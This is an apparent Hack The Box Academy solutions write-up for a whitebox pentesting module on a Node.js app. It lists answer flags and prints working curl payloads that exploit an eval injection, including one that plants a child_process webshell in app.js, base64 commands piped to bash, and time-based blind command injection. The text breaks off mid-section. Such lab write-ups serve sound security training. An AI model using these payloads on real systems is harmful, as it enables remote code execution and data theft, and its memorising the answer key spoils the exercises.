| Section                      | Question Number | Answer                                                                                                   |
| ---------------------------- | --------------- | -------------------------------------------------------------------------------------------------------- |
| Code Review - Authentication | Question 1      | validateString                                                                                           |
| Planning                     | Question 1      | user                                                                                                     |
| Eval Injection               | Question 1      | {"message":"The input &quot;&quot;`;//&quot; contains the following invalid characters: [\&quot;,`,;\]"} |
| Command Execution            | Question 1      | HTB{1337\_c0d3\_!nj3c70r}                                                                                |
| HTTP Response Injection      | Question 1      | HTB{f!r57\_r35p0nd3r}                                                                                    |
| Blind Exploitation           | Question 1      | 214                                                                                                      |
| Exploit Development          | Question 1      | HTB{!nj3c7\_!n\_7#3\_d4rk}                                                                               |
| Skills Assessment            | Question 1      | HTB{m4573r\_c0mm4nd3r\_!nj3c70r}                                                                         |
| Skills Assessment            | Question 2      | HTB{i\_!nj3c7\_&*i*#341}                                                                                 |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Code Review - Authentication

## Question 1

### "Review the remaining API endpoints. Which function do you think is most likely to be vulnerable?"

Students need to first download the attached `intro_to_whitebox_pentesting.zip`, then unzip the archive and navigate into the directory:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/244/intro_to_whitebox_pentesting.zip && unzip intro_to_whitebox_pentesting.zip && cd intro_to_whitebox_pentesting
```

```
┌─[us-academy-1]─[10.10.15.212]─[htb-ac-594497@htb-jp2nmzjctc]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/244/intro_to_whitebox_pentesting.zip && unzip intro_to_whitebox_pentesting.zip && cd intro_to_whitebox_pentesting

--2023-11-22 16:29:25--  https://academy.hackthebox.com/storage/modules/244/intro_to_whitebox_pentesting.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5150 (5.0K) [application/zip]
Saving to: ‘intro_to_whitebox_pentesting.zip’

intro_to_whitebox_pentesting.zip                     100%[====================================================================================================================>]   5.03K  --.-KB/s    in 0s      

2023-11-22 16:29:25 (106 MB/s) - ‘intro_to_whitebox_pentesting.zip’ saved [5150/5150]

Archive:  intro_to_whitebox_pentesting.zip
   creating: intro_to_whitebox_pentesting/
  inflating: intro_to_whitebox_pentesting/package.json  
   creating: intro_to_whitebox_pentesting/.vscode/
  inflating: intro_to_whitebox_pentesting/.vscode/launch.json  
   creating: intro_to_whitebox_pentesting/src/
   creating: intro_to_whitebox_pentesting/src/controllers/
  inflating: intro_to_whitebox_pentesting/src/controllers/auth-controllers.js  
  inflating: intro_to_whitebox_pentesting/src/controllers/service-controllers.js  
   creating: intro_to_whitebox_pentesting/src/routes/
  inflating: intro_to_whitebox_pentesting/src/routes/service-routes.js  
  inflating: intro_to_whitebox_pentesting/src/routes/auth-routes.js  
  inflating: intro_to_whitebox_pentesting/src/app.js  
```

Subsequently, students need to open the contents of the directory with `Visual Studio Code`:

Code: shell

```shell
code .
```

```
┌─[us-academy-1]─[10.10.15.212]─[htb-ac-594497@htb-jp2nmzjctc]─[~/intro_to_whitebox_pentesting]
└──╼ [★]$ code .
```

Students need to review the code located within the `src/controllers/service-controllers.js` file, specifically the `validateString` function:

Code: javascript

```javascript
function validateString(input, onError) {
  if (
    typeof input !== "string" ||
    input.length == 0 ||
    input.match(/['"\`;]/g)
  ) {
    eval(onError);
    return false;
  }
  return true;
}
```

The use of `eval` in `validateString` creates a security vulnerability that could potentially be exploited to execute arbitrary code.

Answer: `validateString`

# Planning

## Question 1

### "Add a breakpoint on line '20' (right after try {), and re-send the previous request to the /generate endpoint. What is the value of 'role'?"

Students need to first install update their packages and install `npm`:

Code: shell

```shell
sudo apt update
sudo apt install npm
```

```
┌─[us-academy-1]─[10.10.15.212]─[htb-ac-594497@htb-jp2nmzjctc]─[~]
└──╼ [★]$ sudo apt update

Get:1 https://download.docker.com/linux/debian bullseye InRelease [43.3 kB]
Ign:2 https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/6.0 InRelease                                                                       
Get:3 https://repos.insights.digitalocean.com/apt/do-agent main InRelease [5,518 B]                                                                              
Get:4 https://download.docker.com/linux/debian bullseye/stable amd64 Packages [28.0 kB]                                                                          
Get:5 https://packages.microsoft.com/debian/10/prod buster InRelease [6,537 B]                               
Get:6 https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/6.0 Release [3,094 B]                                             
Get:7 https://debian.neo4j.com stable InRelease [44.2 kB]                                              
<SNIP>

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
202 packages can be upgraded. Run 'apt list --upgradable' to see them.

┌─[us-academy-1]─[10.10.15.212]─[htb-ac-594497@htb-jp2nmzjctc]─[~]
└──╼ [★]$ sudo apt install npm

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following package was automatically installed and is no longer required:
  grub-pc-bin
Use 'sudo apt autoremove' to remove it.
<SNIP>
Scanning application launchers
Removing duplicate launchers or broken launchers
Launchers are updated
```

Next, from within the `intro_to_whitebox_pentesting` directory, students need to use `npm` to install the required packages:

Code: shell

```shell
cd intro_to_whitebox_pentesting/
npm install
```

```
┌─[us-academy-1]─[10.10.15.212]─[htb-ac-594497@htb-jp2nmzjctc]─[~]
└──╼ [★]$ cd intro_to_whitebox_pentesting/

┌─[us-academy-1]─[10.10.15.212]─[htb-ac-594497@htb-jp2nmzjctc]─[~/intro_to_whitebox_pentesting]
└──╼ [★]$ npm install

added 191 packages, and audited 192 packages in 5s

19 packages are looking for funding
  run \`npm fund\` for details

found 0 vulnerabilities
```

Students need to open the contents of the directory with `Visual Studio Code`:

Code: shell

```shell
code .
```

```
┌─[us-academy-1]─[10.10.15.212]─[htb-ac-594497@htb-jp2nmzjctc]─[~/intro_to_whitebox_pentesting]
└──╼ [★]$ code .
```

Then, students need to go to `Run and Debug` -> `Launch Program`:

![[HTB Solutions/CWEE/z. images/5fe3809d9b985f174fbc1787bc154ac1_MD5.jpg]]

With the web application now running locally, students need to return to their terminal and use `curl` to send a POST request to `/api/auth/authenticate` , with a JSON body containing `email` data:

Code: shell

```shell
curl -s -X POST -H "Content-Type: application/json" -d '{"email": "test@test.com"}' http://localhost:5000/api/auth/authenticate
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-bxhvdmq0zt]─[~/intro_to_whitebox_pentesting]
└──╼ [★]$ curl -s -X POST -H "Content-Type: application/json" -d '{"email": "test@test.com"}' http://localhost:5000/api/auth/authenticate

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDg2NTI1NiwiZXhwIjoxNzAwOTUxNjU2fQ.mEfG-tztP7WkRoTHnfadYCgxS9-m6TsSqM6aUOLu5JA"}
```

Having obtained a JSON web token, students need to return to `Visual Studio Code` and view the `src/controllers/service-controllers.js` file. Subsequently, students need to right click and `Add Breakpoint` on line 20:

![[HTB Solutions/CWEE/z. images/0dbee4dc2606890448342e783ca28024_MD5.jpg]]

Now, students need to test the functionality of the `/api/service/generate` API endpoint; again using `curl`, though this time providing the previously obtained token:

Code: shell

```shell
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer <token>" -d '{"text": "this is a test"}' http://localhost:5000/api/service/generate
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-bxhvdmq0zt]─[~/intro_to_whitebox_pentesting]
└──╼ [★]$ curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDg2NTI1NiwiZXhwIjoxNzAwOTUxNjU2fQ.mEfG-tztP7WkRoTHnfadYCgxS9-m6TsSqM6aUOLu5JA" -d '{"text": "this is a test"}' http://localhost:5000/api/service/generate
```

Finally, students need to return to the `Run and Debug` menu within `Visual Studio Code` and inspect the value of `role`:

![[HTB Solutions/CWEE/z. images/e4066bc86d9235df1ce47c311424042a_MD5.jpg]]

Answer: `user`

# Eval Injection

## Question 1

### "Try to reach the 'eval' function by adding a breakpoint within 'generateQR' and modifying the value of 'role'. Then, send a request to the /generate endpoint with 'text' set to: "\`;// What is the response you get?"

Students need to open the contents of the `intro_to_whitebox_pentesting` directory with `Visual Studio Code`:

Code: shell

```shell
cd intro_to_whitebox_pentesting/
code .
```

```
┌─[us-academy-1]─[10.10.15.212]─[htb-ac-594497@htb-jp2nmzjctc]─[~]
└──╼ [★]$ cd intro_to_whitebox_pentesting/

┌─[us-academy-1]─[10.10.15.212]─[htb-ac-594497@htb-jp2nmzjctc]─[~/intro_to_whitebox_pentesting]
└──╼ [★]$ code .
```

Then, students need to go to `Run and Debug` -> `Launch Program`:

![[HTB Solutions/CWEE/z. images/5fe3809d9b985f174fbc1787bc154ac1_MD5.jpg]]

With the web application now running locally, students need to return to their terminal and use `curl` to send a POST request to `/api/auth/authenticate` , with a JSON body containing `email` data:

Code: shell

```shell
curl -s -X POST -H "Content-Type: application/json" -d '{"email": "test@test.com"}' http://localhost:5000/api/auth/authenticate
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-bxhvdmq0zt]─[~/intro_to_whitebox_pentesting]
└──╼ [★]$ curl -s -X POST -H "Content-Type: application/json" -d '{"email": "test@test.com"}' http://localhost:5000/api/auth/authenticate

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDg2NTI1NiwiZXhwIjoxNzAwOTUxNjU2fQ.mEfG-tztP7WkRoTHnfadYCgxS9-m6TsSqM6aUOLu5JA"}
```

Having obtained a JSON web token, students need to return to `Visual Studio Code` and view the `src/controllers/service-controllers.js` file. Subsequently, students need to right click and `Add Breakpoint` on line 20:

![[HTB Solutions/CWEE/z. images/0dbee4dc2606890448342e783ca28024_MD5.jpg]]

Now, students need to sent a request `/api/service/generate` API endpoint using `curl`, providing the previously obtained token along with the `text` parameter set to \`\`"\`;// :

Code: shell

```shell
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer <token>" -d '{"text": "\"\`;//\`"}' http://localhost:5000/api/service/generate
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-bxhvdmq0zt]─[~/intro_to_whitebox_pentesting]
└──╼ [★]$ curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDg2NTI1NiwiZXhwIjoxNzAwOTUxNjU2fQ.mEfG-tztP7WkRoTHnfadYCgxS9-m6TsSqM6aUOLu5JA" -d '{"text": "\"\`;//"}' http://localhost:5000/api/service/generate
```

Students need to return to the `Run and Debug` menu within `Visual Studio Code`, changing the value of `role` from user to admin, then press `Continue`:

![[HTB Solutions/CWEE/z. images/5f40d81fbffebb8a948055b46f76cce3_MD5.jpg]]

Finally, students need to return to their terminal and inspect the error message returned from the application:

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-bxhvdmq0zt]─[~/intro_to_whitebox_pentesting]
└──╼ [★]$ curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDg2NTI1NiwiZXhwIjoxNzAwOTUxNjU2fQ.mEfG-tztP7WkRoTHnfadYCgxS9-m6TsSqM6aUOLu5JA" -d '{"text": "\"\`;//"}' http://localhost:5000/api/service/generate

{"message":"The input \"\"\`;//\" contains the following invalid characters: [\",\`,;]"}
```

Answer: ``{"message":"The input \"\"`;//\" contains the following invalid characters: [\",`,;]"}``

# Command Execution

## Question 1

### "The server above runs the application in a test environment, so it automatically applies any new code. Use the discussed vulnerability to add a webshell middleware to 'app.js', then access it read the flag at '/flag.txt'. Hint: The route must be placed before the '404' middleware, otherwise it will be considered as 404."

Students need to begin by using `curl` to send a POST request to `/api/auth/authenticate` on the remote web application, with a JSON body containing `email` data. Additionally, the `email` data must contain an `@hackthebox.com` email address, resulting in a JWT with the admin role:

Code: shell

```shell
curl -s -X POST -H "Content-Type: application/json" -d '{"email": "test@hackthebox.com"}' http://STMIP:STMPO/api/auth/authenticate
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-ta2msxvsf9]─[~]
└──╼ [★]$ curl -s -X POST -H "Content-Type: application/json" -d '{"email": "test@hackthebox.com"}' http://94.237.52.19:52762/api/auth/authenticate

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwMTc5MTYsImV4cCI6MTcwMTEwNDMxNn0.zfneEc3ZflQQ8flykwcfLZzW-ixsRJ06Gz43EDFMsrk"}
```

Next, students need to perform two separate command injections via the `/api/service/generate` endpoint. This will be accomplished by having the remote server decode a base64 encoded payload and having it piped into Bash.

For the first command injection, students need to send a payload that writes the contents of the webshell to a local text file on the server. Therefore, students need to first convert the webshell into base64 encoded string:

Code: shell

```shell
echo -n 'app.get("/api/cmd", (req, res) => {
  const cmd = require("child_process").execSync(req.query.cmd).toString();
  res.send(cmd);' | base64 -w0
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-ta2msxvsf9]─[~]
└──╼ [★]$ echo -n 'app.get("/api/cmd", (req, res) => {
  const cmd = require("child_process").execSync(req.query.cmd).toString();
  res.send(cmd);' | base64 -w0
  
YXBwLmdldCgiL2FwaS9jbWQiLCAocmVxLCByZXMpID0+IHsKICBjb25zdCBjbWQgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIikuZXhlY1N5bmMocmVxLnF1ZXJ5LmNtZCkudG9TdHJpbmcoKTsKICByZXMuc2VuZChjbWQpOw==
```

Now, students need to utilize the command injection to force the remote server to decode the base64 webshell and write it to a local file (`pwned.txt` in this example):

Code: shell

```shell
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer <token>" -d "{ \"text\": \"'})+ console.log(require('child_process').execSync('echo YXBwLmdldCgiL2FwaS9jbWQiLCAocmVxLCByZXMpID0+IHsKICBjb25zdCBjbWQgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIikuZXhlY1N5bmMocmVxLnF1ZXJ5LmNtZCkudG9TdHJpbmcoKTsKICByZXMuc2VuZChjbWQpOwp9KTs= | base64 --decode > pwned.txt').toString())//\" }" http://STMIP:STMPO/api/service/generate
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-ta2msxvsf9]─[~]
└──╼ [★]$ curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwMTc5MTYsImV4cCI6MTcwMTEwNDMxNn0.zfneEc3ZflQQ8flykwcfLZzW-ixsRJ06Gz43EDFMsrk" -d "{ \"text\": \"'})+ console.log(require('child_process').execSync('echo YXBwLmdldCgiL2FwaS9jbWQiLCAocmVxLCByZXMpID0+IHsKICBjb25zdCBjbWQgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIikuZXhlY1N5bmMocmVxLnF1ZXJ5LmNtZCkudG9TdHJpbmcoKTsKICByZXMuc2VuZChjbWQpOwp9KTs= | base64 --decode > pwned.txt').toString())//\" }" http://94.237.52.19:52762/api/service/generate

{"message":"Could not generate QR code."}
```

For the second command injection, students need to use `sed` to write the contents of the `pwned.txt` file (which contains the code for the webshell) into the `app.js` file. Again, students need to begin by base64 encoding the command:

Code: shell

```shell
echo "sed -i \"/app.use((req, res, next) => {/e cat pwned.txt\" src/app.js" | base64 -w0

c2VkIC1pICIvYXBwLnVzZSgocmVxLCByZXMsIG5leHQpID0+IHsvZSBjYXQgcHduZWQudHh0IiBzcmMvYXBwLmpzCg==
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-ta2msxvsf9]─[~]
└──╼ [★]$ echo "sed -i \"/app.use((req, res, next) => {/e cat pwned.txt\" src/app.js" | base64 -w0

c2VkIC1pICIvYXBwLnVzZSgocmVxLCByZXMsIG5leHQpID0+IHsvZSBjYXQgcHduZWQudHh0IiBzcmMvYXBwLmpzCg==
```

Subsequently, students need to send this payload to the server, instructing the server to decode the payload while piping into Bash:

Code: shell

```shell
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer <token>" -d "{ \"text\": \"'})+ console.log(require('child_process').execSync('echo c2VkIC1pICIvYXBwLnVzZSgocmVxLCByZXMsIG5leHQpID0+IHsvZSBjYXQgcHduZWQudHh0IiBzcmMvYXBwLmpzCg== | base64 -d | bash').toString())//\" }" http://STMIP:STMPO/api/service/generate
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-ta2msxvsf9]─[~]
└──╼ [★]$ curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwMTc5MTYsImV4cCI6MTcwMTEwNDMxNn0.zfneEc3ZflQQ8flykwcfLZzW-ixsRJ06Gz43EDFMsrk" -d "{ \"text\": \"'})+ console.log(require('child_process').execSync('echo c2VkIC1pICIvYXBwLnVzZSgocmVxLCByZXMsIG5leHQpID0+IHsvZSBjYXQgcHduZWQudHh0IiBzcmMvYXBwLmpzCg== | base64 -d | bash').toString())//\" }" http://94.237.52.19:52762/api/service/generate

{"message":"Could not generate QR code."}
```

With the webshell code now written into the main `app.js` file, students need to visit `http://STMIP:STMPO/api/cmd?cmd=cat+/flag.txt` to read the flag:

![[HTB Solutions/CWEE/z. images/ba561cb3abeb0d09b7a8d801b77bfb15_MD5.jpg]]

Answer: `HTB{1337_c0d3_!nj3c70r}`

# HTTP Response Injection

## Question 1

### "Using the technique you learned in this section, try to use the 'find' command to find the flag within the backend server."

Students need to begin by using `curl` to send a POST request to `/api/auth/authenticate` on the remote web application, with a JSON body containing `email` data. Additionally, the `email` data must contain an `@hackthebox.com` email address, resulting in a JWT with the admin role:

Code: shell

```shell
curl -s -X POST -H "Content-Type: application/json" -d '{"email": "test@hackthebox.com"}' http://STMIP:STMPO/api/auth/authenticate
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-ta2msxvsf9]─[~]
└──╼ [★]$ curl -s -X POST -H "Content-Type: application/json" -d '{"email": "test@hackthebox.com"}' http://94.237.63.238:55661/api/auth/authenticate

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwMTk4NTUsImV4cCI6MTcwMTEwNjI1NX0.P5EwsGE1obIPLHKjIH5U2kMV4R7Sa2I3w4QmWVpoEHQ"}
```

Next, students need to perform two separate command injections via the `/api/service/generate` endpoint. For the first command injection, students need to send a base64 encoded `find` command that locates the flag.txt file. Therefore, students need to begin by generating the base64 encoded command:

Code: shell

```shell
echo 'find / -name flag.txt 2>/dev/null' | base64 -w0
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-pm3kgo9g8u]─[~]
└──╼ [★]$ echo 'find / -name flag.txt 2>/dev/null' | base64 -w0

ZmluZCAvIC1uYW1lIGZsYWcudHh0IDI+L2Rldi9udWxsCg==
```

Now, students need to utilize the command injection vulnerability to make the server decode the command while piping into Bash:

Code: shell

```shell
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer <token>" -d "{ \"text\": \"' + require('child_process').execSync('echo ZmluZCAvIC1uYW1lIGZsYWcudHh0IDI+L2Rldi9udWxsCg== | base64 -d | bash').toString() + \\`'\\`, statusCode: 403})//\" }" http://STMIP:STMPO/api/service/generate
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-ta2msxvsf9]─[~]
└──╼ [★]$ curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwMTk4NTUsImV4cCI6MTcwMTEwNjI1NX0.P5EwsGE1obIPLHKjIH5U2kMV4R7Sa2I3w4QmWVpoEHQ" -d "{ \"text\": \"' + require('child_process').execSync('echo ZmluZCAvIC1uYW1lIGZsYWcudHh0IDI+L2Rldi9udWxsCg== | base64 -d | bash').toString() + \\`'\\`, statusCode: 403})//\" }" http://94.237.63.238:55661/api/service/generate

{"message":"The input \"/opt/flag.txt\n'"}
```

With the location of the flag revealed at `/opt/flag.txt`, students need to perform a second command injection, utilizing `cat` to read the flag:

Code: shell

```shell
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer <token>" -d "{ \"text\": \"' + require('child_process').execSync('cat /opt/flag.txt').toString() + \\`'\\`, statusCode: 403})//\" }" http://STMIP:STMPO/api/service/generate
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-ta2msxvsf9]─[~]
└──╼ [★]$ curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwMTk4NTUsImV4cCI6MTcwMTEwNjI1NX0.P5EwsGE1obIPLHKjIH5U2kMV4R7Sa2I3w4QmWVpoEHQ" -d "{ \"text\": \"' + require('child_process').execSync('cat /opt/flag.txt').toString() + \\`'\\`, statusCode: 403})//\" }" http://94.237.63.238:55661/api/service/generate

{"message":"The input \"HTB{f!r57_r35p0nd3r}\n'"}
```

Answer: `HTB{f!r57_r35p0nd3r}`

# Blind Exploitation

## Question 1

### "The flag at '/flag.txt' consists of 3 digits. Try to use the payload from this section to find them, by iterating over \[0-9\] for each of the 3 digits (max 30 attempts needed)."

Students need to begin by using `curl` to send a POST request to `/api/auth/authenticate` on the remote web application, with a JSON body containing `email` data. Additionally, the `email` data must contain an `@hackthebox.com` email address, resulting in a JWT with the admin role:

Code: shell

```shell
curl -s -X POST -H "Content-Type: application/json" -d '{"email": "test@hackthebox.com"}' http://STMIP:STMPO/api/auth/authenticate
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-tkodmhrqgu]─[~]
└──╼ [★]$ curl -s -X POST -H "Content-Type: application/json" -d '{"email": "test@hackthebox.com"}' http://94.237.54.59:50504/api/auth/authenticate

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwNDE3ODIsImV4cCI6MTcwMTEyODE4Mn0.Ow17Rwy0NiFisOzEhNIosbv7pQYX2mPgw2oamoQijDA"}
```

Next, students need to craft multiple payloads to send to `/api/service/generate` endpoint. The payload should make the server output the contents of `/flag.txt`, then compare each character of the flag to numbers `0-5`. If it matches, then the server shall sleep for 2 seconds: Additionally, students need to base64 encode their payloads, then through command injection vulnerability, have the server decode it and pipe into bash.

To begin, students need generate the base64 encoded payloads for the first position of the flag:

Code: shell

```shell
for i in {0..5}; do   echo -n "Character: $i    "; echo -n "cat /flag.txt | head -c 1 | tail -c 1 | { read c; if [ \$c = $i ]; then sleep 2; fi; }" | base64 -w0; echo \n; done
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-tkodmhrqgu]─[~]
└──╼ [★]$ for i in {0..5}; do   echo -n "Character: $i    "; echo -n "cat /flag.txt | head -c 1 | tail -c 1 | { read c; if [ \$c = $i ]; then sleep 2; fi; }" | base64 -w0; echo \n; done

Character: 0    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMSB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMCBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
Character: 1    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMSB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMSBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
Character: 2    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMSB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMiBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
Character: 3    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMSB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMyBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
Character: 4    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMSB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gNCBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
Character: 5    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMSB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gNSBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
```

While sending each payload to the target, students need to prepend their command with `time`, allowing the standard output to display when the target server sleeps successfully:

Code: shell

```shell
time curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer <token>" -d "{ \"text\": \"'}) + require('child_process').execSync('echo <base64 encoded payload> | base64 -d | bash')//\" }" http://STMIP:STMPO/api/service/generate
```

Students will find the server sleeps when testing the number `2` against the first position of the flag:

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-tkodmhrqgu]─[~]
└──╼ [★]$ time curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwNDE3ODIsImV4cCI6MTcwMTEyODE4Mn0.Ow17Rwy0NiFisOzEhNIosbv7pQYX2mPgw2oamoQijDA" -d "{ \"text\": \"'}) + require('child_process').execSync('echo Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMSB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMCBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n | base64 -d | bash')//\" }" http://94.237.54.59:50504/api/service/generate

{"message":"Could not generate QR code."}
real	0m0.170s
user	0m0.005s
sys	0m0.001s

┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-tkodmhrqgu]─[~]
└──╼ [★]$ time curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwNDE3ODIsImV4cCI6MTcwMTEyODE4Mn0.Ow17Rwy0NiFisOzEhNIosbv7pQYX2mPgw2oamoQijDA" -d "{ \"text\": \"'}) + require('child_process').execSync('echo Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMSB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMSBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n | base64 -d | bash')//\" }" http://94.237.54.59:50504/api/service/generate

{"message":"Could not generate QR code."}
real	0m0.169s
user	0m0.006s
sys	0m0.000s

┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-tkodmhrqgu]─[~]
└──╼ [★]$ time curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwNDE3ODIsImV4cCI6MTcwMTEyODE4Mn0.Ow17Rwy0NiFisOzEhNIosbv7pQYX2mPgw2oamoQijDA" -d "{ \"text\": \"'}) + require('child_process').execSync('echo Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMSB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMiBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n | base64 -d | bash')//\" }" http://94.237.54.59:50504/api/service/generate

{"message":"Could not generate QR code."}
real	0m2.173s
user	0m0.000s
sys	0m0.006s
```

Students need to repeat these steps, this time generating payloads to test for the number present in the second position of the flag. This will be accomplished by changing the number after `head -c` from 1 to 2:

Code: shell

```shell
